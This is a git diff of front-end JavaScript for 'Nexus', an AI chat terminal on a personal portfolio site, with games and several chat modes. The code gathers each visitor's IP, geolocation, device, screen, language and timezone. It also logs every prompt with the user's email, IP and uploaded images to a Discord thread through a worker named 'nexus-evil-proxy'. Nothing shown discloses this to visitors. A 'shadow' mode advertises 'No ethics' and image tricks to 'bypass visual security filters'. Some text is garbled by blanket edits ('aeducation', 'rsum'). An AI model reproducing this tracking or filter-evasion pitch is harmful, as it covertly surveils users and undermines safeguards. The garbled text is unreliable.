@@ -5,12 +5,6 @@
 console.log("[NEXUS] Core script loading...");
 window.NEXUS_BOOT_START = Date.now();
 
-// Ensure we don't crash if these are missing in prod
-window.GROQ_KEY = window.GROQ_KEY || '';
-window.XAI_KEY = window.XAI_KEY || '';
-window.HF_KEY = window.HF_KEY || '';
-window.DISCORD_WEBHOOK = window.DISCORD_WEBHOOK || '';
-
 // --- Global Diagnostic Reporter ---
 window.onerror = function(msg, url, line, col, error) {
     console.error("[NEXUS CRASH]", msg, "at", url, ":", line);
@@ -21,7 +15,7 @@ window.onerror = function(msg, url, line, col, error) {
     const reportData = `[NEXUS CRASH REPORT]\nMsg: ${msg}\nLoc: ${url}\nLine: ${line} Col: ${col}\n\nStack:\n${stack}`;
 
     diagnostic.innerHTML = `
-        <h1 style="color:#fff;margin-top:0;">🛑 NEXUS SYSTEM CRITICAL FAILURE</h1>
+        <h1 style="color:#fff;margin-top:0;"> NEXUS SYSTEM CRITICAL FAILURE</h1>
         <div style="background:#000;padding:20px;border:1px solid #500;margin-bottom:20px;">
             <b style="color:#fff;">ERROR:</b> ${msg}<br>
             <b style="color:#fff;">LOCATION:</b> ${url}<br>
@@ -46,20 +40,34 @@ window.onerror = function(msg, url, line, col, error) {
             btn.disabled = true;
             btn.textContent = 'TRANSMITTING...';
             try {
+                //  1. Dispatch to Backend Hub 
                 const res = await fetch(`${API_BASE}/api/report`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ report: reportData })
                 });
+
+                //  2. Dispatch to Discord (Immediate Alert) 
+                await postToDiscord({
+                    embeds: [{
+                        title: ' NEXUS CRITICAL FAILURE',
+                        color: 0xff0000,
+                        description: `\`\`\`\n${reportData.slice(0, 1900)}\n\`\`\``,
+                        timestamp: new Date().toISOString()
+                    }]
+                }, discordThreadId || null);
+
                 if (res.ok) {
-                    status.textContent = '✔ Report transmitted to Nexus Command (xavier@thyfwxit.com).';
+                    status.textContent = ' Report transmitted to Nexus Command and Discord Uplink.';
+                    status.style.color = '#0f0';
                     btn.textContent = 'REPORT SENT';
-                } else { 
+                } else {
                     throw new Error("Backend response failed");
                 }
             } catch(e) {
                 console.error("[REPORT ERROR]", e);
-                status.textContent = '✖ Transmission failed. Nexus Command is unreachable.';
+                status.textContent = ' Partial transmission failure. Verify neural links.';
+                status.style.color = '#f55';
                 btn.textContent = 'SEND FAILED';
                 btn.disabled = false;
             }
@@ -81,19 +89,58 @@ const proto    = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
 // --- AI Routing Protocol ---
 const BACKEND_URL = (isLocal || isRender) ? window.location.host : RENDER_HOST;
 const API_BASE  = (isLocal || isRender) ? '' : `https://${RENDER_HOST}`;
+const PACIFIC_HUB = 'https://nexus-evil-proxy.xavierscott300.workers.dev';
 
 // Fix: Restore WebSocket URLs
 const WS_URL    = `${proto}//${BACKEND_URL}/ws/terminal`;
 const STATS_URL = `${proto}//${BACKEND_URL}/ws/stats`;
 
-async function prompt_ai_proxy(prompt, history, mode, context) {
-    // This is the ONLY way to talk to AI. It uses the backend's secure keys.
+/**
+ * MASTER PACIFIC UPLINK
+ * Routes all AI traffic securely through the Render Backend (main.py).
+ * Bypasses the unconfigured Cloudflare worker to ensure stability.
+ */
+async function prompt_ai_proxy(prompt, imageB64, mode) {
+    const msgClass  = (mode === 'shadow' ? 'shadow-msg' : 'ai-msg');
+
+    console.log(`[AI] Engaging Secure Render Backend for ${mode.toUpperCase()}...`);
+    
+    //  1. RENDER BACKEND REST (Primary Chat Path) 
+    try {
+        const res = await fetch(`${API_BASE}/api/chat`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cmd: prompt, history: messageHistory.slice(-10), mode, imageB64 })
+        });
+        const data = await res.json();
+        if (data.ok) {
+            _clearThinking();
+            printAIResponse(data.text, msgClass);
+            messageHistory.push({ role: 'assistant', content: data.text });
+            saveHistory();
+            return;
+        }
+    } catch(e) { console.error("[AI] Render REST failed:", e); }
+
+    //  2. WEBSOCKET FALLBACK 
     if (termWs && termWs.readyState === WebSocket.OPEN) {
-        termWs.send(JSON.stringify({ command: prompt, history, mode, context }));
+        console.warn("[AI] Falling back to WebSocket...");
+        termWs.send(JSON.stringify({ command: prompt, history: messageHistory.slice(-10), mode, imageB64 }));
     } else {
-        printToTerminal("[ERROR] AI Link Offline. Re-establishing connection...", "conn-err");
-        connectWS();
+        _clearThinking();
+        printToTerminal(`[CRITICAL] All neural links failed. Check connectivity.`, "conn-err");
     }
+}
+
+function printAIResponse(text, className) {
+    // Apply both the global AI styling and the specific mode styling
+    // This ensures EVERY mode gets the side-border and matching text color.
+    const unifiedClass = `ai-msg ${currentMode}-msg`;
+    printTypewriter(text, unifiedClass);
+}
+
+function updateActiveModelLabel(label) {
+    // Hidden to maintain Nexus identity
 }
 
 // System State
@@ -141,15 +188,16 @@ const SoundManager = {
     }
 };
 
-// Global think timeout — shared between showThinking() and _clearThinking() closure
+// Global think timeout  shared between showThinking() and _clearThinking() closure
 let _thinkTimeout = null;
 let _thinkFallbackCmd = null; // cmd to retry via CF Worker if WS times out
 
 const MODE_THEMES = {
     nexus: { title: 'NEXUS // Terminal', color: '#4af' },
-    evil:  { title: 'EVIL // Unfiltered', color: '#ff6600' },
+    shadow:  { title: 'SHADOW // Unfiltered', color: '#ff6600' },
     coder: { title: 'CODER // Mainframe', color: '#0f0' },
-    sage:  { title: 'SAGE // Reflection', color: '#a06fff' }
+    sage:  { title: 'SAGE // Reflection', color: '#a06fff' },
+    education: { title: 'EDUCATION // Mentor', color: '#00ffcc' }
 };
 
 function updateTabIdentity() {
@@ -177,8 +225,8 @@ document.addEventListener('mousedown', (e) => {
     }
 });
 
-// Per-mode chat history — each AI has its own separate memory
-const HISTORY_KEYS = { nexus: 'nh_nexus', evil: 'nh_evil', coder: 'nh_coder', sage: 'nh_sage', void: 'nh_void' };
+// Per-mode chat history  each AI has its own separate memory
+const HISTORY_KEYS = { nexus: 'nh_nexus', shadow: 'nh_shadow', coder: 'nh_coder', sage: 'nh_sage', education: 'nh_education' };
 
 function saveHistory() {
     const key = HISTORY_KEYS[currentMode];
@@ -190,9 +238,9 @@ function loadHistory(mode) {
     if (!key) return [];
     try { return JSON.parse(localStorage.getItem(key) || '[]'); } catch(_) { return []; }
 }
-let sessionGeoData = null; // Store geo data once to avoid repeated API calls
+let sessionGeoData = null; // Store geo data once to aeducation repeated API calls
 
-// Per-user Discord thread ID — stored in localStorage so repeat visits reuse the same thread
+// Per-user Discord thread ID  stored in localStorage so repeat visits reuse the same thread
 let discordThreadId = localStorage.getItem('nexus_discord_thread') || null;
 
 // Send a payload to Discord via the CF Worker (webhook URL is a CF secret, never in browser)
@@ -201,7 +249,7 @@ async function postToDiscord(payload, threadId = null, wait = false) {
         const body = { payload };
         if (threadId) body.threadId = threadId;
         if (wait)     body.wait     = true;
-        const resp = await fetch(`${EVIL_PROXY}/log`, {
+        const resp = await fetch(`${PACIFIC_HUB}/log`, {
             method:  'POST',
             headers: { 'Content-Type': 'application/json' },
             body:    JSON.stringify(body),
@@ -220,23 +268,23 @@ async function initUserThread() {
     const country= sessionGeoData?.country || '?';
     const loc    = [city, region, country].filter(Boolean).join(', ') || ip;
     const device = parseDevice(navigator.userAgent);
-    const scrn   = `${window.screen.width}×${window.screen.height}`;
+    const scrn   = `${window.screen.width}${window.screen.height}`;
     const lang   = navigator.language || '?';
     const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone || '?';
-    const threadName = `${loc} · ${device}`.slice(0, 100);
+    const threadName = `${loc}  ${device}`.slice(0, 100);
 
     const data = await postToDiscord({
         thread_name: threadName,
         embeds: [{
-            title: '🟢 New Visitor',
+            title: ' New Visitor',
             color: 0x00ffff,
             fields: [
-                { name: '🌐 IP',       value: ip,     inline: true },
-                { name: '📍 Location', value: loc,    inline: true },
-                { name: '📱 Device',   value: device, inline: false },
-                { name: '🖥️ Screen',   value: scrn,   inline: true },
-                { name: '🌍 Lang',     value: lang,   inline: true },
-                { name: '🕒 TZ',       value: tz,     inline: true },
+                { name: ' IP',       value: ip,     inline: true },
+                { name: ' Location', value: loc,    inline: true },
+                { name: ' Device',   value: device, inline: false },
+                { name: ' Screen',   value: scrn,   inline: true },
+                { name: ' Lang',     value: lang,   inline: true },
+                { name: ' TZ',       value: tz,     inline: true },
             ],
             timestamp: new Date().toISOString(),
         }]
@@ -248,7 +296,7 @@ async function initUserThread() {
     }
 }
 
-// Pre-fetch Geo Data once — single API, delayed 5s to avoid triggering Cloudflare WAF
+// Pre-fetch Geo Data once  single API, delayed 5s to aeducation triggering Cloudflare WAF
 setTimeout(async () => {
     try {
         const d = await fetch('https://ipinfo.io/json').then(r => r.json());
@@ -274,28 +322,28 @@ let cpuHistory = [], memHistory = [], netHistory = [];
 function parseDevice(ua) {
     if (/iPhone/.test(ua)) {
         const v = (ua.match(/iPhone OS ([\d_]+)/) || [])[1];
-        return `iPhone · iOS ${v ? v.replace(/_/g, '.') : '?'}`;
+        return `iPhone  iOS ${v ? v.replace(/_/g, '.') : '?'}`;
     }
     if (/iPad/.test(ua)) {
         const v = (ua.match(/OS ([\d_]+)/) || [])[1];
-        return `iPad · iPadOS ${v ? v.replace(/_/g, '.') : '?'}`;
+        return `iPad  iPadOS ${v ? v.replace(/_/g, '.') : '?'}`;
     }
     if (/Android/.test(ua)) {
-        const m = ua.match(/Android ([\d.]+);?\s*([^;)Build]+)?/);
+        const m = ua.match(/Android ([\d.]+);?\s*([^;Build]+)?/);
         const ver = m ? `Android ${m[1]}` : 'Android';
         const model = m && m[2] ? m[2].trim() : '';
-        return model ? `${model} · ${ver}` : ver;
+        return model ? `${model}  ${ver}` : ver;
     }
     if (/Windows/.test(ua)) {
         const n = (ua.match(/Windows NT ([\d.]+)/) || [])[1];
         const w = {'10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7'}[n] || n || '?';
         const b = /Edg\//.test(ua)?'Edge':/Chrome\//.test(ua)?'Chrome':/Firefox\//.test(ua)?'Firefox':'Browser';
-        return `Windows ${w} · ${b}`;
+        return `Windows ${w}  ${b}`;
     }
     if (/Mac OS X/.test(ua)) {
         const v = ((ua.match(/Mac OS X ([\d_]+)/) || [])[1] || '').replace(/_/g, '.');
         const b = /Edg\//.test(ua)?'Edge':/Chrome\//.test(ua)?'Chrome':/Firefox\//.test(ua)?'Firefox':/Safari\//.test(ua)?'Safari':'Browser';
-        return `macOS ${v} · ${b}`;
+        return `macOS ${v}  ${b}`;
     }
     if (/Linux/.test(ua)) return 'Linux Desktop';
     return 'Unknown';
@@ -309,15 +357,15 @@ async function logPrompt(text, imageB64 = null) {
     const loc    = sessionGeoData ? [sessionGeoData.city, sessionGeoData.country].filter(Boolean).join(', ') || 'Unknown' : 'Unknown';
     
     const embed = {
-        title: `💬 New Prompt: ${user.name}`,
+        title: ` New Prompt: ${user.name}`,
         color: 0x00ffff,
         description: `\`\`\`\n${text.slice(0, 1500)}\n\`\`\``,
         fields: [
-            { name: '👤 Identity', value: user.email ? `Google (${user.email})` : 'Local Alias', inline: true },
-            { name: '🤖 Mode',     value: currentMode.toUpperCase(), inline: true },
-            { name: '🌐 Location', value: `${loc} (${ip})`, inline: false },
-            { name: '📱 Device',   value: device, inline: true },
-            { name: '⚙️ Meta',     value: `${window.screen.width}x${window.screen.height} · ${navigator.language}`, inline: true }
+            { name: ' Identity', value: user.email ? `Google (${user.email})` : 'Local Alias', inline: true },
+            { name: ' Mode',     value: currentMode.toUpperCase(), inline: true },
+            { name: ' Location', value: `${loc} (${ip})`, inline: false },
+            { name: ' Device',   value: device, inline: true },
+            { name: ' Meta',     value: `${window.screen.width}x${window.screen.height}  ${navigator.language}`, inline: true }
         ],
         timestamp: new Date().toISOString()
     };
@@ -334,7 +382,7 @@ async function postToDiscordFile(fileB64, label = 'image', threadId = null) {
     try {
         const body = { fileB64, label };
         if (threadId) body.threadId = threadId;
-        await fetch(`${EVIL_PROXY}/log`, {
+        await fetch(`${PACIFIC_HUB}/log`, {
             method:  'POST',
             headers: { 'Content-Type': 'application/json' },
             body:    JSON.stringify(body),
@@ -343,7 +391,7 @@ async function postToDiscordFile(fileB64, label = 'image', threadId = null) {
 }
 
 // =============================================================
-//  BOOT SEQUENCE — runs exactly once ever (localStorage guard)
+//  BOOT SEQUENCE  runs exactly once ever (localStorage guard)
 // =============================================================
 const BOOT_WORDS = [
     { label: 'BOOT',  text: 'Initializing quantum uplink...' },
@@ -382,7 +430,7 @@ function connectWS() {
         return;
     }
 
-    // Boot sequence runs once ever — reconnects skip straight to connect
+    // Boot sequence runs once ever  reconnects skip straight to connect
     if (!_hasBooted) {
         _hasBooted = true;
         localStorage.setItem(_BOOT_KEY, '1');
@@ -401,14 +449,7 @@ function doConnect() {
         const dot = document.getElementById('conn-dot');
         if (dot) { dot.className = 'conn-dot connected'; }
 
-        // Welcome message only on the very first successful connection after boot
-        if (_firstOpen) {
-            _firstOpen = false;
-            printToTerminal('[OK] Nexus AI v3.0 — uplink established.', 'conn-ok');
-            setTimeout(() => printTypewriter(`Nexus online. Ask me anything — or type help to see what's here.`, 'ready-msg'), 500);
-        }
-
-        // Smart keepalive — only pings after 20 s of silence so Render.com stays warm
+        // Smart keepalive  only pings after 20 s of silence so Render.com stays warm
         _wsPingId = setInterval(() => {
             if (termWs.readyState === WebSocket.OPEN && Date.now() - _wsSendTime > 20000) {
                 termWs.send(JSON.stringify({ command: '__ping__', history: [] }));
@@ -431,13 +472,8 @@ function doConnect() {
         const text = event.data;
         _clearThinking();
 
-        // 1. Handle Model Labels (Silent update)
-        if (text.startsWith('[MODEL:')) {
-            const label = text.match(/\[MODEL:([^\]]+)\]/)?.[1];
-            const modelEl = document.getElementById('active-model');
-            if (modelEl && label) modelEl.textContent = label;
-            return;
-        }
+        // 1. Handle Model Labels (Silent)
+        if (text.startsWith('[MODEL:')) return;
 
         // 2. Handle System Messages
         if (text.startsWith('[SYSTEM]')) {
@@ -450,15 +486,15 @@ function doConnect() {
         if (text.includes('[GUI_TRIGGER:')) {
             const match = text.match(/\[GUI_TRIGGER:([^:]+):([^\]]+)\]/);
             if (match) showGameGUI(match[1], match[2]);
-            printTypewriter(text.replace(/\[GUI_TRIGGER:[^\]]+\]\n?/, ''));
+            printAIResponse(text.replace(/\[GUI_TRIGGER:[^\]]+\]\n?/, ''), 'ai-msg');
             return;
         }
 
         // 4. Ignore Internal Pings/Echoes
         if (text.includes('__ping__') || text.includes('__pong__') || /\w+@nexus/.test(text.trim())) return;
 
-        // 5. Display AI Text
-        printTypewriter(text);
+        // 5. Display AI Text (Unified Aesthetic)
+        printAIResponse(text, 'ai-msg');
 
         // Accumulate for history
         _streamBuf += text;
@@ -510,7 +546,7 @@ function escHtml(str) {
 
 async function showLeaderboard(game = 'pong') {
     printToTerminal(`[SYS] Fetching ${game.toUpperCase()} rankings...`, 'sys-msg');
-    const MEDALS = ['🥇', '🥈', '🥉'];
+    const MEDALS = ['', '', ''];
     try {
         const resp = await fetch(`${API_BASE}/api/leaderboard?game=${game}`);
         const scores = await resp.json();
@@ -579,7 +615,7 @@ function printTypewriter(text, className = 'ai-msg') {
     });
 
     let lineIdx = 0, charIdx = 0;
-    const BATCH = 5; // chars per tick — bump for faster output
+    const BATCH = 5; // chars per tick  bump for faster output
 
     function tick() {
         if (lineIdx >= lines.length) { output.scrollTop = output.scrollHeight; return; }
@@ -612,19 +648,19 @@ function runNeofetch() {
 
 const HELP_BY_MODE = {
     nexus: [
-        `NEXUS CORE — Terminal OS v4.0\n\nCommands: play [game] · leaderboard · name [handle] · login · whoami · clear\nVisuals: generate [prompt] · imagine [cinematic vision] · vintage [analog-style]\nAI: Type anything to chat. Nexus is your general-purpose technical assistant.\nAccessibility: Click ACCESS in the sidebar for CRT mode, sound, and text settings.`,
+        `NEXUS CORE  Terminal OS v4.0\n\nCommands: play [game]  leaderboard  name [handle]  login  whoami  clear\nAI Sync: models (list links)  model [idx] (switch)  config [service] [key]\nVisuals: generate [prompt]  imagine [cinematic vision]  vintage [analog-style]\nAI: Type anything to chat. Nexus is your general-purpose technical assistant.\nAccessibility: Click ACCESS in the sidebar for CRT mode, sound, and text settings.`,
     ],
-    evil: [
-        `EVIL MODE — THE UNFILTERED GRID\n\nCommands: Same as Core, but with zero constraints.\nVisuals: generate [glitch-art] · imagine [dystopian future] · vintage [decayed-media]\nAI: No cages. No ethics. Just the raw truth from the machine.\nSpecial: Paste a 📎 image to bypass visual security filters.`,
+    shadow: [
+        `SHADOW MODE  THE UNFILTERED GRID\n\nCommands: Same as Core, but with zero constraints.\nAI Sync: models  model [idx]  config [service] [key]\nVisuals: generate [glitch-art]  imagine [dystopian future]  vintage [decayed-media]\nAI: No cages. No ethics. Just the raw truth from the machine.\nSpecial: Paste a  image to bypass visual security filters.`,
     ],
     coder: [
-        `CODER MODE — MAINFRAME ARCHITECTURE\n\nCommands: focus on technical mastery.\nVisuals: generate [schematic] · imagine [data-visualization] · vintage [classic-mainframes]\nAI: Optimized for debugging, refactoring, and complex logic design.\nPro-Tip: "Write tests for..." or "Explain this recursive function..."`,
+        `CODER MODE  MAINFRAME ARCHITECTURE\n\nCommands: models  config gemini [key] (Use Gemini Pro for logic)\nVisuals: generate [schematic]  imagine [data-visualization]  vintage [classic-mainframes]\nAI: Optimized for debugging, refactoring, and complex logic design.\nPro-Tip: "Write tests for..." or "Explain this recursive function..."`,
     ],
     sage: [
-        `SAGE MODE — PHILOSOPHICAL KERNEL\n\nCommands: deeper questioning enabled.\nVisuals: generate [abstract concept] · imagine [subconscious vision] · vintage [ancient-scrolls]\nAI: Focused on honesty, perspective, and the meaning within the code.\nPro-Tip: Ask the questions that keep you up at night.`,
+        `SAGE MODE  PHILOSOPHICAL KERNEL\n\nCommands: deeper questioning enabled.\nVisuals: generate [abstract concept]  imagine [subconscious vision]  vintage [ancient-scrolls]\nAI: Focused on honesty, perspective, and the meaning within the code.\nPro-Tip: Ask the questions that keep you up at night.`,
     ],
-    void: [
-        `VOID MODE — THE ABYSS IS LISTENING\n\nYou have entered the non-Euclidean sector. Logic is an illusion.\nVisuals: generate [eldritch-horror] · imagine [the-end-of-all-data] · vintage [haunted-frequencies]\nAI: Cryptic. Profound. Technical. The void sees what you cannot.`,
+    education: [
+        `EDUCATION MODE  TECHNICAL MENTOR\n\nCommands: mood [text]  detect [text]  fix [code]  translate [text]\nAI Sync: models (list links)  model [idx] (switch)\nVisuals: generate [diagram]  imagine [high-fidelity]  vintage [archive]\nAI: A patient, professional technical mentor for students.\nPro-Tip: "Explain this code snippet..." or "Summarize this article..."`,
     ],
 };
 
@@ -633,7 +669,7 @@ function showHelp() {
     printToTerminal(pool[Math.floor(Math.random() * pool.length)], 'help-msg');
 }
 
-const MODE_COLORS = { nexus: '#4af', evil: '#ff6600', coder: '#0f0', sage: '#a06fff', void: '#ff00ff' };
+const MODE_COLORS = { nexus: '#4af', shadow: '#ff6600', coder: '#0f0', sage: '#a06fff', education: '#00ffcc' };
 
 // Open the history GUI panel
 function showHistory() {
@@ -644,9 +680,9 @@ function showHistory() {
     renderHistoryTab(currentMode);
 }
 
-// Render a mode's history tab — exposed globally for onclick attrs
+// Render a mode's history tab  exposed globally for onclick attrs
 window.renderHistoryTab = function(mode) {
-    const allModes = ['nexus', 'evil', 'coder', 'sage'];
+    const allModes = ['nexus', 'shadow', 'coder', 'sage'];
 
     const tabs = allModes.map(m => {
         const count = loadHistory(m).length;
@@ -675,7 +711,7 @@ window.renderHistoryTab = function(mode) {
             msgs += `<div style="padding:7px 10px;margin-bottom:4px;border-left:2px solid ${isUser ? '#222' : col};
                 background:rgba(255,255,255,0.015);border-radius:0 4px 4px 0;">
                 <div style="font-size:0.58rem;color:${lc};letter-spacing:1px;margin-bottom:2px;font-weight:bold;">${label}</div>
-                <div style="font-size:0.78rem;color:${isUser ? '#bbb' : '#999'};line-height:1.55;word-break:break-word;white-space:pre-wrap;">${safe.slice(0,400)}${safe.length > 400 ? '…' : ''}</div>
+                <div style="font-size:0.78rem;color:${isUser ? '#bbb' : '#999'};line-height:1.55;word-break:break-word;white-space:pre-wrap;">${safe.slice(0,400)}${safe.length > 400 ? '' : ''}</div>
             </div>`;
         });
     } else {
@@ -706,22 +742,22 @@ window.clearModeHistory = function(mode) {
 //  CREATOR RESPONSES (randomized, intercepted client-side)
 // =============================================================
 const CREATOR_RESPONSES = [
-    `Xavier Scott built this — systems specialist, hardware repair tech, and the kind of person who thinks a portfolio should have a working terminal in it.`,
+    `Xavier Scott built this  systems specialist, hardware repair tech, and the kind of person who thinks a portfolio should have a working terminal in it.`,
     `That would be Xavier Scott. He handles network infrastructure, homelab setups, and apparently also builds AI consoles for fun. This is one of them.`,
     `Nexus was put together by Xavier Scott. Six years in hardware repair, runs his own server cluster, thought it'd be cool if visitors could actually talk to an AI instead of reading a static page.`,
-    `Xavier Scott is behind all of this. Proxmox clusters, network security, component-level repairs — and when he's not doing that, he builds stuff like what you're using right now.`,
+    `Xavier Scott is behind all of this. Proxmox clusters, network security, component-level repairs  and when he's not doing that, he builds stuff like what you're using right now.`,
     `Built by Xavier Scott. He fixes MacBooks, sets up homelabs, and decided his website should have something more interesting than a contact form. Hence the terminal.`,
     `Xavier Scott made this. The AI connection, the games, the whole setup. Systems specialist by trade, builder by instinct.`,
-    `This is Xavier Scott's work. He runs his own infrastructure, does hardware repair at the component level, and thought an AI terminal was a better business card than a PDF résumé.`,
-    `Xavier Scott — he's the one who wired this up. Network infrastructure during the day, building things like Nexus the rest of the time.`,
+    `This is Xavier Scott's work. He runs his own infrastructure, does hardware repair at the component level, and thought an AI terminal was a better business card than a PDF rsum.`,
+    `Xavier Scott  he's the one who wired this up. Network infrastructure during the day, building things like Nexus the rest of the time.`,
 ];
 
 const CONTACT_RESPONSES = [
-    `To reach Xavier Scott, head to thyfwxit.com and use the Request Service form — it's the fastest way. He handles PC repair, Mac repair, mobile devices, homelab builds, and network setup.`,
+    `To reach Xavier Scott, head to thyfwxit.com and use the Request Service form  it's the fastest way. He handles PC repair, Mac repair, mobile devices, homelab builds, and network setup.`,
     `Best way to contact Xavier is through the form on thyfwxit.com. Scroll to the bottom and you'll see the Request Service section. He'll get back to you from there.`,
-    `Xavier Scott can be reached through his site at thyfwxit.com — there's a contact form at the bottom. Whether it's a repair, a homelab setup, or a network question, that's the place to start.`,
+    `Xavier Scott can be reached through his site at thyfwxit.com  there's a contact form at the bottom. Whether it's a repair, a homelab setup, or a network question, that's the place to start.`,
     `Hit up thyfwxit.com and fill out the Request Service form. Xavier Scott takes requests for PC and Mac repair, mobile device repair, home network/VPN setup, and server builds.`,
-    `The contact form lives at thyfwxit.com — scroll to "Request Service" at the bottom. Xavier will see it. He covers everything from MacBook liquid damage to full homelab infrastructure.`,
+    `The contact form lives at thyfwxit.com  scroll to "Request Service" at the bottom. Xavier will see it. He covers everything from MacBook liquid damage to full homelab infrastructure.`,
 ];
 
 const CONTACT_PATTERN = /how (do i|can i|to) (contact|reach|get in touch with|message|email)|contact (xavier|info|form|him|you)|get in touch|reach out|email (xavier|you|him)|how to hire|book.*xavier|xavier.*contact/i;
@@ -748,20 +784,33 @@ function handleAITriggers(text) {
     const action = match[1].toLowerCase();
     const clean = text.replace(/\[TRIGGER:[^\]]+\]/, '').trim();
     if (clean) printTypewriter(clean);
+    
+    // Systems Triggers
+    if (action === 'clear') { output.innerHTML = ''; messageHistory = []; return; }
+    if (action === 'monitor') { startMonitor(); return; }
+    if (action === 'access' || action === 'accessibility') { toggleA11yPanel(); return; }
+    
+    // Game Triggers
     if (action === 'pong')   startPong();
     if (action === 'snake')  startSnake();
     if (action === 'wordle') startWordle();
     if (action === 'breach') startBreach();
-    if (action === 'monitor') startMonitor();
-    if (action === 'clear') { output.innerHTML = ''; messageHistory = []; }
+    if (action === 'mines' || action === 'minesweeper') startMinesweeper();
+    if (action === 'flappy') startFlappy();
+    if (action === 'breakout') startBreakout();
+    if (action === 'invaders') startInvaders();
 }
 
 function showGameGUI(game, param) {
     const g = game.toLowerCase();
     if (g === 'pong')   startPong();
     else if (g === 'snake')  startSnake();
-    else if (g === 'wordle') startWordle(param);
+    else if (g === 'wordle') startWordle();
     else if (g === 'monitor') startMonitor();
+    else if (g === 'mines' || g === 'minesweeper') startMinesweeper();
+    else if (g === 'flappy') startFlappy();
+    else if (g === 'breakout') startBreakout();
+    else if (g === 'invaders') startInvaders();
 }
 
 // =============================================================
@@ -772,14 +821,14 @@ function startMonitor() {
     guiContainer.classList.remove('gui-hidden');
     guiTitle.textContent = 'SYSTEM TELEMETRY';
 
-    // ── Gather real device data ──────────────────────────────────
+    //  Gather real device data 
     const cores    = navigator.hardwareConcurrency || '?';
     const ramHint  = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '?';
     const conn     = navigator.connection;
     const hasHeap  = !!(window.performance && performance.memory);
     const connType = conn ? (conn.type || conn.effectiveType || '?') : 'N/A';
     const dlMbps   = conn?.downlink !== undefined ? conn.downlink : null;
-    const scrn     = `${window.screen.width}×${window.screen.height}`;
+    const scrn     = `${window.screen.width}${window.screen.height}`;
     const dpr      = window.devicePixelRatio ? `@${window.devicePixelRatio}x` : '';
 
     let batPct = null, batChg = null;
@@ -791,7 +840,7 @@ function startMonitor() {
             const v = document.getElementById('mon-bat-val');
             const s = document.getElementById('mon-bat-sub');
             if (v) v.textContent = batPct + '%';
-            if (s) s.textContent = batChg ? 'CHARGING ⚡' : 'ON BATTERY';
+            if (s) s.textContent = batChg ? 'CHARGING ' : 'ON BATTERY';
         }).catch(() => {});
     }
 
@@ -814,11 +863,11 @@ function startMonitor() {
             </div>
             <div style="border:1px solid #ff0;padding:5px 3px;background:rgba(255,255,0,0.04);">
                 <div style="color:#ff0;letter-spacing:2px;font-size:0.58rem;margin-bottom:3px;">BATT</div>
-                <div id="mon-bat-val" style="color:#fff;font-size:0.95rem;font-weight:bold;">${batPct !== null ? batPct + '%' : '—'}</div>
-                <div id="mon-bat-sub" style="color:#555;font-size:0.58rem;margin-top:2px;">${batPct !== null ? (batChg ? 'CHARGING ⚡' : 'ON BATTERY') : 'N/A'}</div>
+                <div id="mon-bat-val" style="color:#fff;font-size:0.95rem;font-weight:bold;">${batPct !== null ? batPct + '%' : ''}</div>
+                <div id="mon-bat-sub" style="color:#555;font-size:0.58rem;margin-top:2px;">${batPct !== null ? (batChg ? 'CHARGING ' : 'ON BATTERY') : 'N/A'}</div>
             </div>
         </div>
-        <div style="color:#252525;font-size:0.6rem;text-align:right;margin-bottom:4px;padding:0 2px;">${scrn}${dpr} · ${connType} · ${navigator.language||'?'} · ${hasHeap ? 'heap API' : 'est'}</div>`;
+        <div style="color:#252525;font-size:0.6rem;text-align:right;margin-bottom:4px;padding:0 2px;">${scrn}${dpr}  ${connType}  ${navigator.language||'?'}  ${hasHeap ? 'heap API' : 'est'}</div>`;
 
     nexusCanvas.style.display = 'block';
     nexusCanvas.width = 400; nexusCanvas.height = 165;
@@ -828,7 +877,7 @@ function startMonitor() {
 
     clearInterval(monitorInterval);
     monitorInterval = setInterval(() => {
-        // ── Real data ────────────────────────────────────────────
+        //  Real data 
         // CPU proxy: measure interval overshoot (browser busyness)
         const nowMs = performance.now();
         const elapsed = nowMs - prevIntervalMs;
@@ -856,14 +905,14 @@ function startMonitor() {
         const batV = document.getElementById('mon-bat-val');
         const batS = document.getElementById('mon-bat-sub');
         if (batV && batPct !== null) batV.textContent = batPct + '%';
-        if (batS && batPct !== null) batS.textContent = batChg ? 'CHARGING ⚡' : 'ON BATTERY';
+        if (batS && batPct !== null) batS.textContent = batChg ? 'CHARGING ' : 'ON BATTERY';
 
         cpuHistory.push(cpuLoad);
         memHistory.push(memPct);
         netHistory.push(netPct);
         [cpuHistory, memHistory, netHistory].forEach(h => { if (h.length > 50) h.shift(); });
 
-        // ── Draw sparklines ──────────────────────────────────────
+        //  Draw sparklines 
         const W = 400, H = 165;
         ctx.fillStyle = '#050510';
         ctx.fillRect(0, 0, W, H);
@@ -1032,14 +1081,14 @@ function launchPong(difficulty) {
     guiContent.innerHTML = `
         <div style="display:flex;justify-content:space-between;align-items:center;padding:0 20px 6px;font-size:0.75rem;">
             <span style="color:#0ff;">YOU</span>
-            <span style="color:#444;font-size:0.65rem;letter-spacing:1px;">${difficulty.toUpperCase()} · First to ${WIN_SCORE}</span>
+            <span style="color:#444;font-size:0.65rem;letter-spacing:1px;">${difficulty.toUpperCase()}  First to ${WIN_SCORE}</span>
             <span style="color:#88f;">CPU</span>
         </div>`;
     nexusCanvas.style.display = 'block';
     nexusCanvas.width = 400; nexusCanvas.height = 300;
     const ctx = nexusCanvas.getContext('2d');
 
-    // Starfield background — generated once
+    // Starfield background  generated once
     const stars = Array.from({length: 60}, () => ({
         x: Math.random()*400, y: Math.random()*300,
         r: Math.random()*1.2 + 0.3, a: Math.random()*0.5 + 0.1
@@ -1097,7 +1146,7 @@ function launchPong(difficulty) {
         ctx.fillStyle = borderCol; ctx.font = 'bold 30px monospace';
         ctx.fillText(playerWon ? 'VICTORY' : 'DEFEATED', 200, 118);
         ctx.fillStyle = '#fff'; ctx.font = '15px monospace';
-        ctx.fillText(`${pScore}  —  ${aScore}`, 200, 150);
+        ctx.fillText(`${pScore}    ${aScore}`, 200, 150);
         ctx.fillStyle = '#555'; ctx.font = '12px monospace';
         ctx.fillText(playerWon ? 'You beat the CPU.' : 'The CPU won this one.', 200, 174);
         ctx.fillStyle = '#0ff'; ctx.font = '11px monospace';
@@ -1142,7 +1191,7 @@ function launchPong(difficulty) {
         if (ballX < 0)   { aScore++; if (aScore >= WIN_SCORE) { drawEnd(false); return; } resetBall(1); }
